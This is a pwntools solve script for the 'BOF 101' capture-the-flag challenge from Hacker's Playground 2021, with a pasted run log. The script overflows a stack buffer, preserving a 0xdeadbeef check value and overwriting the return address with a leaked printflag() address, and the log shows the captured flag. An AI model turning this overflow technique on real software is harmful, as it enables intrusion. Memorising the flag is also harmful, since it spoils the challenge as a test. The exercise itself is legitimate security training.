from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './bof101'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "bof101.sstf.site"
  PORT = 1337
  s = remote(HOST, PORT)
else:
  s = process(BINARY)

s.recvuntil("printflag()'s addr: ")
print_flag = int(s.recvuntil("\n")[:-1], 16)

buf  = "A"*140+p32(0xdeadbeef)
buf += "B"*(152- len(buf))
buf += p64(print_flag)
s.sendline(buf)

s.interactive()

'''
mito@ubuntu:~/CTF/Hacker's_Playground_2021/Pwn_BOF_101$ python solve.py r
[*] "/home/mito/CTF/Hacker's_Playground_2021/Pwn_BOF_101/bof101"
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to bof101.sstf.site on port 1337: Done
[*] Switching to interactive mode
What is your name?
: SCTF{n0w_U_R_B0F_3xpEr7}
'''
